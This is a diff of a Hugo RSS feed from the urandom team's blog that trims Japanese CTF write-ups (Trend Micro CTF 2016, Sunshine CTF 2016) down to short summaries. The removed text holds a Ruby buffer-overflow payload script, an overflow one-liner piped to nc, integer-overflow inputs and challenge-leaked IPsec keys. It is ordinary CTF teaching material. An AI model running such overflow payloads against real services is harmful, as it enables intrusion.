@@ -2,11 +2,14 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Write Ups on urandom</title>
-    <link>//blog.urandom.team/categories/write-ups/index.xml</link>
+    <link>//blog.urandom.team/categories/write-ups/</link>
     <description>Recent content in Write Ups on urandom</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-jp</language>
-    <atom:link href="//blog.urandom.team/categories/write-ups/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 17 Aug 2016 00:17:26 +0900</lastBuildDate>
+    
+	<atom:link href="//blog.urandom.team/categories/write-ups/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Trend Micro CTF 2016 Online qualifier</title>
@@ -14,212 +17,17 @@
       <pubDate>Wed, 17 Aug 2016 00:17:26 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/tmctf2016-qual/</guid>
-      <description>
-
-&lt;p&gt;日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた&lt;a href=&#34;http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/&#34;&gt;Trend Micro CTF 2016&lt;/a&gt;のwrite-upです。&lt;/p&gt;
-
-&lt;p&gt;urandomは4問解答し600点、92位でした。&lt;/p&gt;
-
-&lt;p&gt;Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。&lt;/p&gt;
-
-&lt;h1 id=&#34;analysis-offensive-100&#34;&gt;Analysis - Offensive 100&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Analysis/Offensive&lt;/p&gt;
-
-&lt;p&gt;Points: 100&lt;/p&gt;
-
-&lt;p&gt;Please enter key. Key is TMCTF flag.&lt;/p&gt;
-
-&lt;p&gt;Download the file
-Decrypt the downloaded file by the following command.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;unzip files1.zip&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;この問題は巨大なJavaScriptから正解の鍵を得るというものです。
-まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var ko = &amp;quot;c33367701511b4f6020ec61ded352059&amp;quot;;
-
-var ka = &amp;quot;61636f697b57b5b7d389db0edb801fc3&amp;quot;;
-
-var kq = &amp;quot;d2172edf24129e06f3913376a12919a4&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;c33367701511b4f6020ec61ded352059&lt;/code&gt; → &lt;code&gt;654321&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;61636f697b57b5b7d389db0edb801fc3&lt;/code&gt; → &lt;code&gt;qwerty&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;d2172edf24129e06f3913376a12919a4&lt;/code&gt; → &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;そして次の処理でこれらの文字列を変数&lt;code&gt;nl&lt;/code&gt;に従って並び換えているということが分かります。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var c = &amp;quot;&amp;quot;, d = &amp;quot;&amp;quot;, e = &amp;quot;&amp;quot;;
-for (var f = 0; f &amp;lt; b.length; ) {
-    c += b[nl[++f]];
-    d += b[nl[++f]];
-    e += b[nl[++f]];
-}
-
-// ......中略......
-
-var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最終的にフラグは&lt;code&gt;TMCTF{q6r4dy5ei2na1twm3}&lt;/code&gt;でした。&lt;/p&gt;
-
-&lt;h1 id=&#34;analysis-offensive-200&#34;&gt;Analysis - Offensive 200&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Analysis - offensive&lt;/p&gt;
-
-&lt;p&gt;Points: 200&lt;/p&gt;
-
-&lt;p&gt;This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.&lt;/p&gt;
-
-&lt;p&gt;The following code contains a bug that can be exploited to read back a flag:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int pwned;
-char buffer[1024];
-
-DWORD WINAPI CallBack(LPVOID lpParameter) {
-	pwned = 0;
-	ZeroMemory(buffer, 1024);
-	SOCKET *sock = (SOCKET *)lpParameter;
-	SOCKET _sock = *sock;
-	send(_sock, &amp;quot;Welcome&amp;quot;, 8, 0);
-	int ret = 0;
-	ret = recv(_sock, buffer, 1028, 0);
-	printf(&amp;quot;[x] RET: %d.\n&amp;quot;, ret);
-	printf(&amp;quot;[x] PWNED: 0x%x.\n&amp;quot;, pwned);
-	Sleep(1);
-	if (((pwned &amp;gt;&amp;gt; 16)&amp;amp;0xFFFF ^ 0xc0fe) == 0x7eaf &amp;amp;&amp;amp; (((pwned &amp;amp; 0xFFFF)^0x1a1a) == 0xdae4)) {
-
-			send(_sock, &amp;quot;PWNED&amp;quot;, 5, 0);
-			ReadAndReturn(L&amp;quot;key.txt&amp;quot;, _sock);
-			closesocket(_sock);
-			return 0;
-	}
-	else {
-		send(_sock, &amp;quot;GO AWAY&amp;quot;, 7, 0);
-		closesocket(_sock);
-	}
-
-	return 0;
- }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Craft a packet that would return a valid flag. Good luck!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;code&gt;buffer&lt;/code&gt;が1024バイトしか確保されていないにもかかわらず、11行目で &lt;code&gt;ret = recv(_sock, buffer, 1028, 0);&lt;/code&gt; と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。&lt;/p&gt;
-
-&lt;p&gt;なぜか &lt;code&gt;nc&lt;/code&gt; が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
-
-HOST = &#39;52.197.128.90&#39;
-port = (80..85).to_a.sample
-
-puts &amp;quot;connecting #{HOST}:#{port}&amp;quot;
-sock = TCPSocket.open(&#39;52.197.128.90&#39;, port)
-
-payload = &#39;a&#39; * 1024 + &amp;quot;\xfe\xc0\x51\xbe&amp;quot;
-
-sock.read(8)
-sock.send(payload, 0)
-while r = sock.gets
-  puts r
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;そして正解をメモし忘れた 😇&lt;/p&gt;
-
-&lt;h1 id=&#34;misc-100&#34;&gt;Misc 100&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Misc(iot and network)&lt;/p&gt;
-
-&lt;p&gt;Points: 100&lt;/p&gt;
-
-&lt;p&gt;Please analyze this pcap.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。&lt;/p&gt;
-
-&lt;p&gt;Wiresharkでtelnetでのやりとりをテキストとして見ると、 &lt;code&gt;ip xfrm state&lt;/code&gt;を叩いている箇所がある。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
-.sudo ip xfrm state
-[sudo] password for reds: ynwa
-.
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xfab21777 reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
-	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
-	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xeea1503c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
-	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
-	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に &lt;code&gt;flag.png&lt;/code&gt; というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。&lt;/p&gt;
-
-&lt;h1 id=&#34;misc-200&#34;&gt;Misc 200&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Misc(iot and network)&lt;/p&gt;
-
-&lt;p&gt;Points: 200&lt;/p&gt;
-
-&lt;p&gt;find all LTE bands this phone supported.&lt;/p&gt;
-
-&lt;p&gt;the final answer will be from small to big, and use &amp;lsquo;,&amp;rsquo; to seperate without spaces.&lt;/p&gt;
-
-&lt;p&gt;example&amp;gt; if the answer is band 1 and 2 and 3, the key should be: &amp;ldquo;TMCTF{1,2,3}&amp;rdquo;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;code&gt;ModemSettings.txt&lt;/code&gt; というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。&lt;/p&gt;
-
-&lt;p&gt;この &lt;code&gt;ModemSettings.txt&lt;/code&gt; はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。&lt;/p&gt;
-
-&lt;p&gt;LTEのバンドに関する設定は&amp;rdquo;6828&amp;rdquo;番にあるという。該当する箇所を引用する。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;6828 (0x1AAC)   -   OK
-FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。&lt;/p&gt;
-
-&lt;p&gt;寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == &#39;1&#39; }.map { |x| x[1] }.join(&#39;,&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+      <description>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。
+urandomは4問解答し600点、92位でした。
+Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。
+Analysis - Offensive 100  Category: Analysis/Offensive
+Points: 100
+Please enter key. Key is TMCTF flag.
+Download the file Decrypt the downloaded file by the following command.
+openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip
+unzip files1.zip
+ この問題は巨大なJavaScriptから正解の鍵を得るというものです。 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。
+var ko = &amp;quot;c33367701511b4f6020ec61ded352059&amp;quot;; var ka = &amp;quot;61636f697b57b5b7d389db0edb801fc3&amp;quot;; var kq = &amp;quot;d2172edf24129e06f3913376a12919a4&amp;quot;;  これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</description>
     </item>
     
     <item>
@@ -228,187 +36,17 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
       <pubDate>Tue, 15 Mar 2016 01:42:29 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/sunshine-ctf-2016/</guid>
-      <description>
-
-&lt;p&gt;2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された&lt;a href=&#34;http://ctf.bsidesorlando.org/&#34;&gt;Sunshine CTF 2016&lt;/a&gt;のwrite-upです。&lt;/p&gt;
-
-&lt;p&gt;なお、今回は以下のメンバー編成で参加しました。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;mayth （土曜日を寝て潰す担当）&lt;/li&gt;
-&lt;li&gt;op （たまに現れていくらかの助言と違法語句を残して去って行く担当）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ESTはクソ。&lt;/p&gt;
-
-&lt;h1 id=&#34;forensics-50-butterfly-effect&#34;&gt;Forensics 50: Butterfly Effect&lt;/h1&gt;
-
-&lt;p&gt;&lt;code&gt;butterfly.png&lt;/code&gt;が与えられる。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www1.chapman.edu/~nabav100/ImgStegano/&#34;&gt;ImgStegano&lt;/a&gt;にファイルを読み込ませて&amp;rdquo;Image &amp;gt; Enhanced LSB&amp;rdquo;とするとフラグが現れた。&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{RE4DY_THE_4CID_M4GNET!}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;exploitation-50-alligatorsim95&#34;&gt;Exploitation 50: alligatorsim95&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Don&amp;rsquo;t try to automate adding X eggs at a time&lt;/p&gt;
-
-&lt;p&gt;legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;※プログラムは与えられない。&lt;/p&gt;
-
-&lt;p&gt;指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;-&amp;gt; u r... AN ALLIGATOR!!
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;echo&lt;/code&gt;とかで入力を機械的に流し込もうとしたとき (&amp;ldquo;Don&amp;rsquo;t try to automate adding X eggs at a time&amp;rdquo;)&lt;/li&gt;
-&lt;li&gt;0や数字として解釈出来ない数を与えたとき&lt;/li&gt;
-&lt;li&gt;一定時間が経過したとき&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;この条件下で卵の数を大きくする問題。&lt;/p&gt;
-
-&lt;p&gt;色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。
-これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;-&amp;gt; u r... AN ALLIGATOR!!
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got 1337 eggz in ur nest, how many you gonna lay alligator?? -2147483647
-~~ producing eggz ~~
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got -2147482310 eggz in ur nest, how many you gonna lay alligator?? -10
-~~ producing eggz ~~
-.. simulating alligator lifecycle ..
-.. simulating alligator throwing physics..
--&amp;gt; you got -2147482320 eggz in ur nest, how many you gonna lay alligator?? -40000
-~~ producing eggz ~~
--&amp;gt; dang 2147444976 is a lotta eggs
--&amp;gt; as a god among gators here is ur crown:
-sun{int_0verflow_i5_a_g0od_st4rt}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{int_0verflow_i5_a_g0od_st4rt}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;exploitation-55-dance&#34;&gt;Exploitation 55: Dance&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。&lt;/p&gt;
-
-&lt;p&gt;サーバーに接続すると以下のような文字が流れてくる。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
-give us ur sick dance moves like so:
-whip,naenae,whip,whip,naenae&amp;lt;ENTER&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;whip&lt;/code&gt;か&lt;code&gt;naenae&lt;/code&gt;をカンマ区切りで並べて送信すると&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;こんな感じで対応したアクションと愉快なAAが流れてくる。&lt;/p&gt;
-
-&lt;p&gt;当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。&lt;/p&gt;
-
-&lt;p&gt;その結果、こちらからの入力を受け取るバッファについて、&lt;code&gt;memset&lt;/code&gt;で80bytesを&lt;code&gt;NULL&lt;/code&gt;で初期化しているにも関わらず、&lt;code&gt;fgets&lt;/code&gt;で最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。&lt;/p&gt;
-
-&lt;p&gt;入力の読み込みはだいたい次のようなロジックになっている。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;while (strlen(buf) &amp;gt; 0) {
-  if (*buf == &#39;n&#39;) {
-    buf += 7;
-    donaenae();
-  } else if (*buf == &#39;w&#39;) {
-    buf += 5;
-    dowhip();
-  }
-}
-check_flag();
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;先頭しか見てないっぽいので適当に80文字の&amp;rdquo;n&amp;rdquo;を送り付けたところ、フラグが得られた。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% ruby -e &#39;puts &amp;quot;n&amp;quot; * 0x50&#39; | nc ****
-welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
-give us ur sick dance moves like so:
-whip,naenae,whip,whip,naenae&amp;lt;ENTER&amp;gt;
-do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-(snip)
-do the naenae
-(\)
-  \(:O)
-   /||\_
-_/¯    ¯\_
-girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
-
-cool dance! come again!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;sun{d4nc3_0n_th3_s7ack}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&#34;misc-50-find-floridaman&#34;&gt;Misc 50: Find Floridaman&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;In other news&amp;hellip; Floridaman did what with an alligator?&lt;/p&gt;
-
-&lt;p&gt;Remember, this has the normal flag format.&lt;/p&gt;
-
-&lt;p&gt;Hint: You need only look at comments from Florida-based news websites.&lt;/p&gt;
-
-&lt;p&gt;Hint: Gator went threw a window!&lt;/p&gt;
-
-&lt;p&gt;Hint: &amp;ldquo;Flori-duh&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;NOTE: Flag was posted before the 12th&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;フロリダマンを探すマン。&lt;/p&gt;
-
-&lt;p&gt;問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。&lt;/p&gt;
-
-&lt;p&gt;ヒントが3つになってから、そのヒントを元に&amp;rdquo;Flori-duh Alligator&amp;rdquo;で探してみると、次の記事が見つかった。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.mypalmbeachpost.com/news/news/crime-law/wendys-alligator-thrower-is-only-fulfilling-his-fl/nqNfr/&#34;&gt;Wendy’s alligator-thrower is only fulfilling his Flori-duh destiny&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;この記事のReader Commentsにフラグがある。&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Summerc137 3 days ago
-May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}&lt;/p&gt;
-
-&lt;p&gt;sun{1s_th1s_even_real_l1fe?}&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy&amp;rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。&lt;/p&gt;
-</description>
+      <description>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催されたSunshine CTF 2016のwrite-upです。
+なお、今回は以下のメンバー編成で参加しました。
+ mayth （土曜日を寝て潰す担当） op （たまに現れていくらかの助言と違法語句を残して去って行く担当）  ESTはクソ。
+Forensics 50: Butterfly Effect butterfly.pngが与えられる。
+ImgSteganoにファイルを読み込ませて&amp;rdquo;Image &amp;gt; Enhanced LSB&amp;rdquo;とするとフラグが現れた。
+ sun{RE4DY_THE_4CID_M4GNET!}
+ Exploitation 50: alligatorsim95  Don&amp;rsquo;t try to automate adding X eggs at a time
+legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness
+ ※プログラムは与えられない。
+指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。
+-&amp;gt; u r.</description>
     </item>
     
   </channel>
